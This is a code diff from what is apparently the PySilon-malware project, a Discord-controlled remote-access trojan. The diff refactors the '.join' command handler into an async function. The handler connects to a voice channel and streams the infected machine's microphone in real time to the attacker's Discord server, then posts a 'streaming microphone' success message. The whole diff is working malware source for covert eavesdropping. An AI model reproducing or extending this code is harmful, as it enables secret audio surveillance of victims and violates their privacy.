@@ -45,22 +45,23 @@ class PyAudioPCM(discord.AudioSource):
         except Exception:
             pass
 
-if message.content.startswith('.join'):
-    await message.delete()
-    canal_voz = client.get_channel(channel_ids['voice'])
-    
-    if canal_voz:
-        voice_client = message.guild.voice_client if message.guild else None
-        if voice_client and voice_client.is_connected():
-            await voice_client.move_to(canal_voz)
-        else:
-            voice_client = await canal_voz.connect(self_deaf=True)
+async def procesar_comando_join(message, client, channel_ids):
+    if message.content.startswith('.join'):
+        await message.delete()
+        canal_voz = client.get_channel(channel_ids['voice'])
         
-        if voice_client.is_playing():
-            voice_client.stop()
+        if canal_voz:
+            voice_client = message.guild.voice_client if message.guild else None
+            if voice_client and voice_client.is_connected():
+                await voice_client.move_to(canal_voz)
+            else:
+                voice_client = await canal_voz.connect(self_deaf=True)
+            
+            if voice_client.is_playing():
+                voice_client.stop()
 
-        voice_client.play(PyAudioPCM())
-        
-        embed = discord.Embed(title="🟢 Success", description=f'```Joined voice-channel and streaming microphone in realtime```', colour=discord.Colour.green())
-        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
-        await message.channel.send(embed=embed)
+            voice_client.play(PyAudioPCM())
+            
+            embed = discord.Embed(title="🟢 Success", description=f'```Joined voice-channel and streaming microphone in realtime```', colour=discord.Colour.green())
+            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
+            await message.channel.send(embed=embed)
